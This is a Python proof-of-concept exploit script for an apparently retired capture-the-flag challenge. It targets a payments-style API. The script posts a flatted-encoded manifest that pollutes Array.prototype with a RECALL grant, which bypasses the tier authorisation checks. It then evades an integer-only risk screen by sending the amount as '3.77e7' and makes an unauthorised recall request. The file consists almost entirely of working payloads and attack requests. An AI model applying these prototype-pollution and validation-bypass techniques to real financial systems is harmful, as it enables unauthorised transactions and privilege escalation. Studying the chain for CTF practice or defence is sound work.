#!/usr/bin/env python3
"""Cutover — PoC.

Exploit chain: (1) flatted prototype pollution — a manifest posted as
text/plain with `"basis":"__proto__"` makes the engine's flatted parser resolve
the reference to Array.prototype, and `merge()` then writes the attacker's
`hints` ({"RECALL":true}) onto Array.prototype; tier grants are arrays used as
lookup tables, so `permitted(..., "RECALL")` passes for every session.
normalise() runs before validate(), so pollution happens even for manifests
later rejected. (2) the risk gateway screens only plain integer minor units;
`3.77e7` is "undetermined" and defer_downstream forwards it, while the engine's
JSON.parse normalises it to 37700000, matching the settled aggregate.

Usage:
    python3 cutover.py [base_url] [recall_path]

recall_path defaults to /api/v1/recall; the recall endpoint path is not named
in the writeup — confirm it from /api/v1/schema. The CTF instance is retired;
this PoC documents the exploit path and does not contact any live service.
"""

import hashlib
import json
import sys

import requests

# Hostile batch identified in the retired-challenge writeup: the only batch
# adversarial on every axis (settled 37,700,000 > 29,000,000 rail cap; declared
# understates settlement by 3,100,000; ~2.9x historical max).
BATCH = "MRN-7C81FF"
SETTLED_AGGREGATE = 37700000
SETTLED_EXPONENT = "3.77e7"  # defeats the integer-only gateway screen

# flatted wire payload ("1".."7" are flatted references into the flat array;
# "__proto__" resolves as a property of the flat array itself).
FLATTED_MANIFEST = (
    '[{"batch":"1","originator":"2","valueDate":"3","declaredAggregateMinor":1,'
    '"instructions":"4","basis":"__proto__","hints":"7"},'
    '"MRN-PP-77","ALMCXZ2LXXX","2026-11-06",'
    '["5"],{"counterparty":"6","amountMinor":1},"MCSA/LIQ",{"RECALL":true}]'
)


def main() -> int:
    base = sys.argv[1] if len(sys.argv) > 1 else "http://<instance>"
    recall_path = sys.argv[2] if len(sys.argv) > 2 else "/api/v1/recall"
    session = requests.Session()

    print("[*] recon: /api/v1/schema")
    r = session.get(f"{base}/api/v1/schema", timeout=15)
    print(f"    /api/v1/schema -> {r.status_code} {r.text[:400]}")

    print("[*] step 1: flatted prototype pollution via /api/v1/manifests")
    r = session.post(f"{base}/api/v1/manifests", data=FLATTED_MANIFEST,
                     headers={"Content-Type": "text/plain"}, timeout=15)
    print(f"    -> {r.status_code} {r.text[:200]}  # 201/400 both pollute Array.prototype")

    print("[*] step 2: tier gate should now be bypassed (404 not 403)")
    probe = json.dumps({"type": "RECALL", "batch": "NOPE", "value": 1})  # under cap
    r = session.post(f"{base}{recall_path}", data=probe,
                     headers={"Content-Type": "application/json"}, timeout=15)
    print(f"    -> {r.status_code} {r.text[:200]}")

    print("[*] step 3: gateway screens value; exponent form defers downstream")
    probe = json.dumps({"type": "RECALL", "batch": "NOPE", "value": SETTLED_AGGREGATE})
    r = session.post(f"{base}{recall_path}", data=probe,
                     headers={"Content-Type": "application/json"}, timeout=15)
    print(f"    integer 37700000 -> {r.status_code} {r.text[:200]}  # X-Screening: reject")
    # Raw body so the exponent literal survives exactly as sent.
    r = session.post(f"{base}{recall_path}",
                     data='{"type":"RECALL","batch":"NOPE","value":3.77e7}',
                     headers={"Content-Type": "application/json"}, timeout=15)
    print(f"    exponent 3.77e7 -> {r.status_code} {r.text[:200]}  # X-Screening: defer")

    unlock = hashlib.sha256(f"cutover|{BATCH}|{SETTLED_AGGREGATE}".encode()).hexdigest()
    print(f"[*] unlock digest: sha256('cutover|{BATCH}|{SETTLED_AGGREGATE}')")

    print(f"[*] step 4: recall {BATCH} with exponent-form value")
    # Raw JSON: the gateway must see the exponent literal, not a float.
    body = ('{"type":"RECALL","batch":"' + BATCH + '","value":' + SETTLED_EXPONENT
            + ',"unlock":"' + unlock + '"}')
    r = session.post(f"{base}{recall_path}", data=body,
                     headers={"Content-Type": "application/json"}, timeout=15)
    print(f"    -> {r.status_code}")
    print(r.text)  # expected: 200 OK with receipt; receipt 'authorization' carries the clearance
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
